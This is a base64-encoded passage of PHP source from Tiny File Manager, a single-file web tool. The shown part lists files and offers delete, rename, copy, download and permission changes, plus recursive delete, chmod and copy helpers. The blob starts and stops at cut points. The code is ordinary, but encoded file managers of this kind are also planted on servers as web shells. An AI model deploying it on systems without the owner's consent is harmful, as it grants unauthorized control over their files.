ICAgICAgICAgICAgICAgICAgICA8L3RkPjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICA8dGQgZGF0YS1zb3J0PTw/cGhwIGVjaG8gZm1fZW5jKCRmKSA/Pj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZpbGVuYW1lIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoc3RydG9sb3dlcihwYXRoaW5mbygkZiwgUEFUSElORk9fRVhURU5TSU9OKSksIGFycmF5KCdnaWYnLCAnanBnJywgJ2pwZWcnLCAncG5nJywgJ2JtcCcsICdpY28nLCAnc3ZnJywgJ3dlYnAnLCAnYXZpZicpKSk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICRpbWFnZVByZXZpZXcgPSBmbV9lbmMoRk1fUk9PVF9VUkwgLiAoRk1fUEFUSCAhPSAnJyA/ICcvJyAuIEZNX1BBVEggOiAnJykgLiAnLycgLiAkZik7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ijw/cGhwIGVjaG8gJGZpbGVsaW5rID8+IiBkYXRhLXByZXZpZXctaW1hZ2U9Ijw/cGhwIGVjaG8gJGltYWdlUHJldmlldyA/PiIgdGl0bGU9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmKSA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI8P3BocCBlY2hvICRmaWxlbGluayA/PiIgdGl0bGU9Ijw/cGhwIGVjaG8gJGYgPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9Ijw/cGhwIGVjaG8gJGltZyA/PiI+PC9pPiA8P3BocCBlY2hvIGZtX2NvbnZlcnRfd2luKGZtX2VuYygkZikpID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobygkaXNfbGluayA/ICcgJnJhcnI7IDxpPicgLiByZWFkbGluaygkcGF0aCAuICcvJyAuICRmKSAuICc8L2k+JyA6ICcnKSA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLW9yZGVyPSJiLTw/cGhwIGVjaG8gc3RyX3BhZCgkZmlsZXNpemVfcmF3LCAxOCwgIjAiLCBTVFJfUEFEX0xFRlQpOyA/PiI+PHNwYW4gdGl0bGU9Ijw/cGhwIHByaW50ZignJXMgYnl0ZXMnLCAkZmlsZXNpemVfcmF3KSA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRmaWxlc2l6ZTsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvc3Bhbj48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8dGQgZGF0YS1vcmRlcj0iYi08P3BocCBlY2hvICRkYXRlX3NvcnRpbmc7Pz4iPjw/cGhwIGVjaG8gJG1vZGlmID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/PjxhIHRpdGxlPSI8P3BocCBlY2hvICdDaGFuZ2UgUGVybWlzc2lvbnMnID8+IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7Y2htb2Q9PD9waHAgZWNobyB1cmxlbmNvZGUoJGYpID8+Ij48P3BocCBlY2hvICRwZXJtcyA/PjwvYT48P3BocCBlbHNlOiA/Pjw/cGhwIGVjaG8gJHBlcm1zID8+PD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjw/cGhwIGVjaG8gZm1fZW5jKCRvd25lclsnbmFtZSddIC4gJzonIC4gJGdyb3VwWyduYW1lJ10pID8+PC90ZD4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+DQogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iaW5saW5lLWFjdGlvbnMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdEZWxldGUnKSA/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RlbD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iIG9uY2xpY2s9ImNvbmZpcm1EYWlsb2coZXZlbnQsIDEyMDksICc8P3BocCBlY2hvIGxuZygnRGVsZXRlJykuJyAnLmxuZygnRmlsZScpOyA/PicsJzw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKTsgPz4nLCB0aGlzLmhyZWYpOyI+IDxpIGNsYXNzPSJmYSBmYS10cmFzaC1vIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnUmVuYW1lJykgPz4iIGhyZWY9IiMiIG9uY2xpY2s9InJlbmFtZSgnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcyhGTV9QQVRIKSkgPz4nLCAnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcygkZikpID8+Jyk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUtbyI+PC9pPjwvYT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0NvcHlUbycpID8+Li4uIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtjb3B5PTw/cGhwIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCAuICcvJyAuICRmLCAnLycpKSA/PiI+PGkgY2xhc3M9ImZhIGZhLWZpbGVzLW8iPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRGlyZWN0TGluaycpID8+IiBocmVmPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9ST09UX1VSTCAuIChGTV9QQVRIICE9ICcnID8gJy8nIC4gRk1fUEFUSCA6ICcnKSAuICcvJyAuICRmKSA/PiIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1saW5rIj48L2k+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdEb3dubG9hZCcpID8+IiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7ZGw9PD9waHAgZWNobyB1cmxlbmNvZGUoJGYpID8+IiBvbmNsaWNrPSJjb25maXJtRGFpbG9nKGV2ZW50LCAxMjExLCAnPD9waHAgZWNobyBsbmcoJ0Rvd25sb2FkJyk7ID8+JywnPD9waHAgZWNobyB1cmxlbmNvZGUoJGYpOyA/PicsIHRoaXMuaHJlZik7Ij48aSBjbGFzcz0iZmEgZmEtZG93bmxvYWQiPjwvaT48L2E+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgIGZsdXNoKCk7DQogICAgICAgICAgICAgICAgJGlrKys7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChlbXB0eSgkZm9sZGVycykgJiYgZW1wdHkoJGZpbGVzKSkgeyA/Pg0KICAgICAgICAgICAgICAgIDx0Zm9vdD4NCiAgICAgICAgICAgICAgICAgICAgPHRyPjw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48L3RkPjw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49Ijw/cGhwIGVjaG8gKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpID8gJzYnIDogJzQnID8+Ij48ZW0+PD9waHAgZWNobyBsbmcoJ0ZvbGRlciBpcyBlbXB0eScpID8+PC9lbT48L3RkPg0KICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgIDwvdGZvb3Q+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgIH0gZWxzZSB7ID8+DQogICAgICAgICAgICAgICAgPHRmb290Pg0KICAgICAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImdyYXkiIGNvbHNwYW49Ijw/cGhwIGVjaG8gKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpID8gKEZNX1JFQURPTkxZID8gJzYnIDonNycpIDogKEZNX1JFQURPTkxZID8gJzQnIDogJzUnKSA/PiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0Z1bGxTaXplJykuJzogPHNwYW4gY2xhc3M9ImJhZGdlIHRleHQtYmctbGlnaHQgYm9yZGVyLXJhZGl1cy0wIj4nLmZtX2dldF9maWxlc2l6ZSgkYWxsX2ZpbGVzX3NpemUpLic8L3NwYW4+JyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdGaWxlJykuJzogPHNwYW4gY2xhc3M9ImJhZGdlIHRleHQtYmctbGlnaHQgYm9yZGVyLXJhZGl1cy0wIj4nLiRudW1fZmlsZXMuJzwvc3Bhbj4nID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0ZvbGRlcicpLic6IDxzcGFuIGNsYXNzPSJiYWRnZSB0ZXh0LWJnLWxpZ2h0IGJvcmRlci1yYWRpdXMtMCI+Jy4kbnVtX2ZvbGRlcnMuJzwvc3Bhbj4nID8+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgIDwvdGZvb3Q+DQogICAgICAgICAgICAgICAgPD9waHAgfSA/Pg0KICAgICAgICA8L3RhYmxlPg0KICAgIDwvZGl2Pg0KDQogICAgPGRpdiBjbGFzcz0icm93Ij4NCiAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tOSI+DQogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3QtaW5saW5lIGZvb3Rlci1hY3Rpb24iPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+IDxhIGhyZWY9IiMvc2VsZWN0LWFsbCIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiIgb25jbGljaz0ic2VsZWN0X2FsbCgpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NlbGVjdEFsbCcpID8+IDwvYT48L2xpPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+PGEgaHJlZj0iIy91bnNlbGVjdC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9InVuc2VsZWN0X2FsbCgpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS13aW5kb3ctY2xvc2UiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VuU2VsZWN0QWxsJykgPz4gPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48YSBocmVmPSIjL2ludmVydC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9ImludmVydF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtdGgtbGlzdCI+PC9pPiA8P3BocCBlY2hvIGxuZygnSW52ZXJ0U2VsZWN0aW9uJykgPz4gPC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaGlkZGVuIiBuYW1lPSJkZWxldGUiIGlkPSJhLWRlbGV0ZSIgdmFsdWU9IkRlbGV0ZSIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJzw/cGhwIGVjaG8gbG5nKCdEZWxldGUgc2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlcnM/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWRlbGV0ZScpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtdHJhc2giPjwvaT4gPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IDwvYT48L2xpPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0iemlwIiBpZD0iYS16aXAiIHZhbHVlPSJ6aXAiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnQ3JlYXRlIGFyY2hpdmU/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXppcCcpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1ppcCcpID8+IDwvYT48L2xpPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0idGFyIiBpZD0iYS10YXIiIHZhbHVlPSJ0YXIiIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnQ3JlYXRlIGFyY2hpdmU/Jyk7ID8+JykiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXRhcicpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1RhcicpID8+IDwvYT48L2xpPg0KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibGlzdC1pbmxpbmUtaXRlbSI+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImhpZGRlbiIgbmFtZT0iY29weSIgaWQ9ImEtY29weSIgdmFsdWU9IkNvcHkiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWNvcHknKS5jbGljaygpOyIgY2xhc3M9ImJ0biBidG4tc21hbGwgYnRuLW91dGxpbmUtcHJpbWFyeSBidG4tMiI+PGkgY2xhc3M9ImZhIGZhLWZpbGVzLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NvcHknKSA/PiA8L2E+PC9saT4NCiAgICAgICAgICAgIDwvdWw+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMyBkLW5vbmUgZC1zbS1ibG9jayI+PGEgaHJlZj0iaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImZsb2F0LXJpZ2h0IHRleHQtbXV0ZWQiPlRpbnkgRmlsZSBNYW5hZ2VyIDw/cGhwIGVjaG8gVkVSU0lPTjsgPz48L2E+PC9kaXY+DQogICAgICAgIDw/cGhwIGVsc2U6ID8+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPjxhIGhyZWY9Imh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pbyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJmbG9hdC1yaWdodCB0ZXh0LW11dGVkIj5UaW55IEZpbGUgTWFuYWdlciA8P3BocCBlY2hvIFZFUlNJT047ID8+PC9hPjwvZGl2Pg0KICAgICAgICA8P3BocCBlbmRpZjsgPz4NCiAgICA8L2Rpdj4NCjwvZm9ybT4NCg0KPD9waHANCmZtX3Nob3dfZm9vdGVyKCk7DQoNCi8vIC0tLSBFTkQgSFRNTCAtLS0NCg0KLy8gRnVuY3Rpb25zDQoNCi8qKg0KICogSXQgcHJpbnRzIHRoZSBjc3MvanMgZmlsZXMgaW50byBodG1sDQogKiBAcGFyYW0ga2V5IFRoZSBrZXkgb2YgdGhlIGV4dGVybmFsIGZpbGUgdG8gcHJpbnQuDQogKi8NCmZ1bmN0aW9uIHByaW50X2V4dGVybmFsKCRrZXkpIHsNCiAgICBnbG9iYWwgJGV4dGVybmFsOw0KDQogICAgaWYoIWFycmF5X2tleV9leGlzdHMoJGtleSwgJGV4dGVybmFsKSkgew0KICAgICAgICAvLyB0aHJvdyBuZXcgRXhjZXB0aW9uKCdLZXkgbWlzc2luZyBpbiBleHRlcm5hbDogJyAuIGtleSk7DQogICAgICAgIGVjaG8gIjwhLS0gRVhURVJOQUw6IE1JU1NJTkcgS0VZICRrZXkgLS0+IjsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGVjaG8gIiRleHRlcm5hbFska2V5XSI7DQp9DQoNCi8qKg0KICogVmVyaWZ5IENTUkYgVE9LRU4gYW5kIHJlbW92ZSBhZnRlciBjZXJpZnkNCiAqIEBwYXJhbSBzdHJpbmcgJHRva2VuDQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gdmVyaWZ5VG9rZW4oJHRva2VuKSANCnsNCiAgICBpZiAoaGFzaF9lcXVhbHMoJF9TRVNTSU9OWyd0b2tlbiddLCAkdG9rZW4pKSB7IA0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovKioNCiAqIERlbGV0ZSAgZmlsZSBvciBmb2xkZXIgKHJlY3Vyc2l2ZWx5KQ0KICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX3JkZWxldGUoJHBhdGgpDQp7DQogICAgaWYgKGlzX2xpbmsoJHBhdGgpKSB7DQogICAgICAgIHJldHVybiB1bmxpbmsoJHBhdGgpOw0KICAgIH0gZWxzZWlmIChpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7DQogICAgICAgICRvayA9IHRydWU7DQogICAgICAgIGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICghZm1fcmRlbGV0ZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG9rID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICgkb2spID8gcm1kaXIoJHBhdGgpIDogZmFsc2U7DQogICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7DQogICAgICAgIHJldHVybiB1bmxpbmsoJHBhdGgpOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCi8qKg0KICogUmVjdXJzaXZlIGNobW9kDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcGFyYW0gaW50ICRmaWxlbW9kZQ0KICogQHBhcmFtIGludCAkZGlybW9kZQ0KICogQHJldHVybiBib29sDQogKiBAdG9kbyBXaWxsIHVzZSBpbiBtYXNzIGNobW9kDQogKi8NCmZ1bmN0aW9uIGZtX3JjaG1vZCgkcGF0aCwgJGZpbGVtb2RlLCAkZGlybW9kZSkNCnsNCiAgICBpZiAoaXNfZGlyKCRwYXRoKSkgew0KICAgICAgICBpZiAoIWNobW9kKCRwYXRoLCAkZGlybW9kZSkpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkb2JqZWN0cyA9IHNjYW5kaXIoJHBhdGgpOw0KICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkb2JqZWN0cyBhcyAkZmlsZSkgew0KICAgICAgICAgICAgICAgIGlmICgkZmlsZSAhPSAnLicgJiYgJGZpbGUgIT0gJy4uJykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoIWZtX3JjaG1vZCgkcGF0aCAuICcvJyAuICRmaWxlLCAkZmlsZW1vZGUsICRkaXJtb2RlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0gZWxzZWlmIChpc19saW5rKCRwYXRoKSkgew0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgcmV0dXJuIGNobW9kKCRwYXRoLCAkZmlsZW1vZGUpOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCi8qKg0KICogQ2hlY2sgdGhlIGZpbGUgZXh0ZW5zaW9uIHdoaWNoIGlzIGFsbG93ZWQgb3Igbm90DQogKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZQ0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX2lzX3ZhbGlkX2V4dCgkZmlsZW5hbWUpDQp7DQogICAgJGFsbG93ZWQgPSAoRk1fRklMRV9FWFRFTlNJT04pID8gZXhwbG9kZSgnLCcsIEZNX0ZJTEVfRVhURU5TSU9OKSA6IGZhbHNlOw0KDQogICAgJGV4dCA9IHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsNCiAgICAkaXNGaWxlQWxsb3dlZCA9ICgkYWxsb3dlZCkgPyBpbl9hcnJheSgkZXh0LCAkYWxsb3dlZCkgOiB0cnVlOw0KDQogICAgcmV0dXJuICgkaXNGaWxlQWxsb3dlZCkgPyB0cnVlIDogZmFsc2U7DQp9DQoNCi8qKg0KICogU2FmZWx5IHJlbmFtZQ0KICogQHBhcmFtIHN0cmluZyAkb2xkDQogKiBAcGFyYW0gc3RyaW5nICRuZXcNCiAqIEByZXR1cm4gYm9vbHxudWxsDQogKi8NCmZ1bmN0aW9uIGZtX3JlbmFtZSgkb2xkLCAkbmV3KQ0Kew0KICAgICRpc0ZpbGVBbGxvd2VkID0gZm1faXNfdmFsaWRfZXh0KCRuZXcpOw0KDQogICAgaWYoIWlzX2Rpcigkb2xkKSkgew0KICAgICAgICBpZiAoISRpc0ZpbGVBbGxvd2VkKSByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgcmV0dXJuICghZmlsZV9leGlzdHMoJG5ldykgJiYgZmlsZV9leGlzdHMoJG9sZCkpID8gcmVuYW1lKCRvbGQsICRuZXcpIDogbnVsbDsNCn0NCg0KLyoqDQogKiBDb3B5IGZpbGUgb3IgZm9sZGVyIChyZWN1cnNpdmVseSkuDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcGFyYW0gc3RyaW5nICRkZXN0DQogKiBAcGFyYW0gYm9vbCAkdXBkIFVwZGF0ZSBmaWxlcw0KICogQHBhcmFtIGJvb2wgJGZvcmNlIENyZWF0ZSBmb2xkZXIgd2l0aCBzYW1lIG5hbWVzIGluc3RlYWQgZmlsZQ0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX3Jjb3B5KCRwYXRoLCAkZGVzdCwgJHVwZCA9IHRydWUsICRmb3JjZSA9IHRydWUpDQp7DQogICAgaWYgKGlzX2RpcigkcGF0aCkpIHsNCiAgICAgICAgaWYgKCFmbV9ta2RpcigkZGVzdCwgJGZvcmNlKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7DQogICAgICAgICRvayA9IHRydWU7DQogICAgICAgIGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICghZm1fcmNvcHkoJHBhdGggLiAnLycgLiAkZmlsZSwgJGRlc3QgLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRvayA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkb2s7DQogICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7DQogICAgICAgIHJldHVybiBmbV9jb3B5KCRwYXRoLCAkZGVzdCwgJHVwZCk7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCg0KLyoqDQogKiBTYWZlbHkgY3JlYXRlIGZvbGRlcg0KICogQHBhcmFtIHN0cmluZyAkZGlyDQogKiBAcGFyYW0gYm9vbCAkZm9yY2UNCiAqIEByZXR1cm4gYm9vbA0KICovDQpmdW5jdGlvbiBmbV9ta2RpcigkZGlyLCAkZm9yY2UpDQp7DQogICAgaWYgKGZpbGVfZXhpc3RzKCRkaXIpKSB7DQogICAgICAgIGlmIChpc19kaXIoJGRpcikpIHsNCiAgICAgICAgICAgIHJldHVybiAkZGlyOw0KICAgICAgICB9IGVsc2VpZiAoISRmb3JjZSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHVubGluaygkZGlyKTsNCiAgICB9DQogICAgcmV0dXJuIG1rZGlyKCRkaXIsIDA3NzcsIHRydWUpOw0KfQ0KDQovKioNCiAqIFNhZmVseSBjb3B5IGZpbGUNCiAqIEBwYXJhbSBzdHJpbmcgJGYxDQogKiBAcGFyYW0gc3RyaW5nICRmMg0KICogQHBhcmFtIGJvb2wgJHVwZCBJbmRpY2F0ZXMgaWYgZmlsZSBzaG91bGQgYmUgdXBkYXRlZCB3aXRoIG5ldyBjb250ZW50DQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1fY29weSgkZjEsICRmMiwgJHVwZCkNCnsNCiAgICAkdGltZTEgPSBmaWxlbXRpbWUoJGYxKTsNCiAgICBpZiAoZmlsZV9leGlzdHMoJGYyKSkgew0KICAgICAgICAkdGltZTIgPSBmaWxlbXRpbWUoJGYyKTsNCiAgICAgICAgaWYgKCR0aW1lMiA+PSAkdGltZTEgJiYgJHVwZCkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgICRvayA9IGNvcHkoJGYxLCAkZjIpOw0KICAgIGlmICgkb2spIHsNCiAgICAgICAgdG91Y2goJGYyLCAkdGltZTEpOw0KICAgIH0NCiAgICByZ